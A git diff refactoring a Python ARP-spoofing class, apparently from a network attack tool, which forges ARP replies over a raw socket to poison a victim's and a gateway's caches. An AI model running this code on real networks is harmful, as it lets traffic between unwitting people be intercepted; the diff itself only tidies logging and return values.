@@ -14,8 +14,10 @@
 #
 # Written by:
 #        Nadzeya Hutsko <nadzya.info@gmail.com>
+"""The module for ARP spoofing class"""
 
 
+import sys
 import socket
 import textwrap
 import time
@@ -43,7 +45,9 @@ class ARPSpoofer:
         self.mac = make_valid_mac_address(your_mac)
         _LOGGER.debug(
             "Creating an ARPSpoofer object with your interface %s"
-            " and MAC-address %s" % (interface, your_mac)
+            " and MAC-address %s",
+            interface,
+            your_mac,
         )
         self.description = textwrap.dedent(
             """\
@@ -73,7 +77,7 @@ class ARPSpoofer:
         self.gateway_mac = make_valid_mac_address(gateway_mac)
         self.gateway_ip = socket.inet_aton(validate_ip_address(gateway_ip))
         _LOGGER.debug(
-            "Adding gateway with MAC %s and IP %s" % (gateway_mac, gateway_ip)
+            "Adding gateway with MAC %s and IP %s", gateway_mac, gateway_ip
         )
 
     def add_victim(self, victim_mac, victim_ip):
@@ -87,7 +91,7 @@ class ARPSpoofer:
         self.victim_mac = make_valid_mac_address(victim_mac)
         self.victim_ip = socket.inet_aton(validate_ip_address(victim_ip))
         _LOGGER.debug(
-            "Adding gateway with MAC %s and IP %s" % (victim_mac, victim_ip)
+            "Adding gateway with MAC %s and IP %s", victim_mac, victim_ip
         )
 
     def run(self):
@@ -95,9 +99,9 @@ class ARPSpoofer:
         _LOGGER.warning(
             "Running the ARP spoofing attack. Press Ctrl+C to stop"
         )
-        self._make_prototcol_headers()
-        self._make_packet_for_gateway()
-        self._make_packet_for_victim()
+        protocol = self._make_prototcol_headers()
+        gateway_packet = self._make_packet_for_gateway()
+        victim_packet = self._make_packet_for_victim()
         try:
             connect = socket.socket(
                 socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)
@@ -105,19 +109,19 @@ class ARPSpoofer:
             connect.bind((self.interface, socket.htons(0x0800)))
         except Exception as exc:
             _LOGGER.error(exc)
-            exit(1)
+            sys.exit(1)
 
         request_victim = (
-            self.victim_packet
-            + self.protocol
+            victim_packet
+            + protocol
             + self.mac
             + self.gateway_ip
             + self.victim_mac
             + self.victim_ip
         )
         request_gateway = (
-            self.gateway_packet
-            + self.protocol
+            gateway_packet
+            + protocol
             + self.mac
             + self.victim_ip
             + self.gateway_mac
@@ -142,14 +146,17 @@ class ARPSpoofer:
         hlen = b"\x06"  # Hardware Length
         plen = b"\x04"  # Protocol Length
         operation = b"\x00\x02"  # Operation Code - Response
-        self.protocol = htype + ptype + hlen + plen + operation  # Body
+        protocol = htype + ptype + hlen + plen + operation  # Body
+        return protocol
 
     def _make_packet_for_gateway(self):
         """Create a packet sample that will be send to the gateway"""
         arp_code = b"\x08\x06"  # Protocol code
-        self.gateway_packet = self.gateway_mac + self.mac + arp_code
+        gateway_packet = self.gateway_mac + self.mac + arp_code
+        return gateway_packet
 
     def _make_packet_for_victim(self):
         """Create a packet sample that will be send to the victim"""
         arp_code = b"\x08\x06"  # Protocol code
-        self.victim_packet = self.victim_mac + self.mac + arp_code
+        victim_packet = self.victim_mac + self.mac + arp_code
+        return victim_packet
